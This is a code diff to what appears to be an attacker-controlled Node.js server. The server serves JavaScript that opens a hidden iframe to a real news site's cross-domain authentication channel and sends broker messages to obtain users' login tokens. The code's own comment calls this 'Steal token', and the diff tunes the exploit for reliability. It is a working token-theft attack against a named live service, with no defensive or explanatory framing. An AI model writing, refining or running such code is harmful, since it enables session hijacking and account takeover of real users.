@@ -40,9 +40,13 @@ const server = http.createServer((req, res) => {
   try {
     var SERVER = '${SELF}';
 
-    // Step 1: Steal token via postMessage to xd-channel iframe
+    // Remove old stale xd-channel iframe
+    var old = document.getElementById('xdchannel');
+    if (old) old.remove();
+
+    // Create a FRESH xd-channel iframe
     var tokenData = await new Promise(function(ok, fail) {
-      var t = setTimeout(function(){ fail('timeout') }, 10000);
+      var t = setTimeout(function(){ fail('timeout') }, 15000);
 
       window.addEventListener('message', function h(e) {
         if (e.origin !== 'https://my.foxbusiness.com') return;
@@ -56,21 +60,19 @@ const server = http.createServer((req, res) => {
         } catch(x) {}
       });
 
-      var f = document.getElementById('xdchannel');
-      if (!f) {
-        f = document.createElement('iframe');
-        f.id = 'xdchannel';
-        f.src = 'https://my.foxbusiness.com/xd-channel.html?_x_auth=foxid&';
-        f.style.display = 'none';
-        (document.body || document.documentElement).appendChild(f);
-        f.onload = function() {
-          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
+      var f = document.createElement('iframe');
+      f.id = 'xd-steal-' + Date.now();
+      f.src = 'https://my.foxbusiness.com/xd-channel.html?_x_auth=foxid&';
+      f.style.display = 'none';
+      (document.body || document.documentElement).appendChild(f);
+
+      f.onload = function() {
+        // Wait for ag.app.js inside iframe to fully initialize
+        setTimeout(function() {
           f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
-        };
-      } else {
-        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
-        f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'hasPendingPasswordless',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
-      }
+          f.contentWindow.postMessage({type:'fnnBrokerRequest',name:'silentLogin',origin:'https://www.foxbusiness.com'},'https://my.foxbusiness.com');
+        }, 1500);
+      };
     });
 
     var tk = tokenData.token;
